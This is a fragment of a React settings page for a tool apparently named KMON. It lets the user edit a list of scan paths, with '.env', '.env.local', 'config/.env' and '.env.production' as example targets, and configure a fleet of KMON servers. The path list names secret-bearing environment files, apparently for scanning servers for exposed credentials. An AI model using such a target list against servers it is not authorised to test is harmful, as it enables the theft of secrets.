                )}
                <Button
                  size="sm"
                  onClick={handleSavePaths}
                  disabled={pathsSaving || pathsLoading}
                  className="text-xs font-mono"
                >
                  <Save className="w-3.5 h-3.5 mr-1.5" />
                  {pathsSaving ? "Saving…" : "Save paths"}
                </Button>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            {pathsLoading ? (
              <div className="text-xs text-muted-foreground font-mono py-4">Loading paths…</div>
            ) : (
              <Textarea
                value={pathsText}
                onChange={e => setPathsText(e.target.value)}
                className="min-h-[300px] font-mono text-xs bg-background border-border resize-y"
                placeholder=".env&#10;.env.local&#10;config/.env&#10;.env.production&#10;..."
                spellCheck={false}
              />
            )}
            <div className="text-xs text-muted-foreground font-mono mt-2">
              Current: {pathsText.split("\n").filter(l => l.trim()).length} paths · Changes take effect on next scan start
            </div>
          </CardContent>
        </Card>

        {/* ── Fleet Config ── */}
        <FleetConfigSection />

      </div>
    </div>
  );
}

// ── Fleet Configuration Section ───────────────────────────────────────────────

interface FleetServerCfg {
  id: string;
  name: string;
  url: string;
  password: string;
  enabled: boolean;
  addedAt: string;
}

interface FleetCfg {
  enabled: boolean;
  servers: FleetServerCfg[];
}

function FleetConfigSection() {
  const [cfg, setCfg] = useState<FleetCfg>({ enabled: false, servers: [] });
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);

  useEffect(() => {
    fetch("/api/fleet/config")
      .then((r) => r.json())
      .then((d) => setCfg(d as FleetCfg))
      .catch(() => { /* ignore */ })
      .finally(() => setLoading(false));
  }, []);

  const toggleEnabled = async (val: boolean) => {
    setSaving(true);
    try {
      await fetch("/api/fleet/config", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ enabled: val }),
      });
      setCfg((c) => ({ ...c, enabled: val }));
      toast.success(val ? "Fleet enabled — Fleet section appears in menu" : "Fleet disabled");
      window.dispatchEvent(new CustomEvent("fleet-config-changed"));
    } catch { toast.error("Failed"); }
    finally { setSaving(false); }
  };

  if (loading) return null;

  return (
    <Card className="border-primary/20">
      <CardHeader>
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Wifi className="w-5 h-5 text-primary" />
            <div>
              <CardTitle className="font-mono text-sm uppercase">Server Fleet</CardTitle>
              <CardDescription className="font-mono text-xs mt-0.5">
                {cfg.enabled
                  ? `Main panel mode · ${cfg.servers.length} server(s) — manage in Fleet section`
                  : "Aggregate results from multiple KMON servers"}
              </CardDescription>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <span className="text-xs font-mono text-muted-foreground">
              {cfg.enabled ? "Enabled" : "Disabled"}
            </span>
            <Switch checked={cfg.enabled} onCheckedChange={toggleEnabled} disabled={saving} />
          </div>
        </div>
      </CardHeader>
      {cfg.enabled && (
        <CardContent>
          <div className="text-[10px] font-mono text-muted-foreground bg-muted/30 rounded p-2.5">
            Fleet is active. Go to{" "}
            <a href="/fleet" className="text-primary hover:underline font-bold">Fleet</a>
            {" "}to manage servers, view dashboards and access aggregated results.
          </div>
        </CardContent>
      )}
    </Card>
  );
}
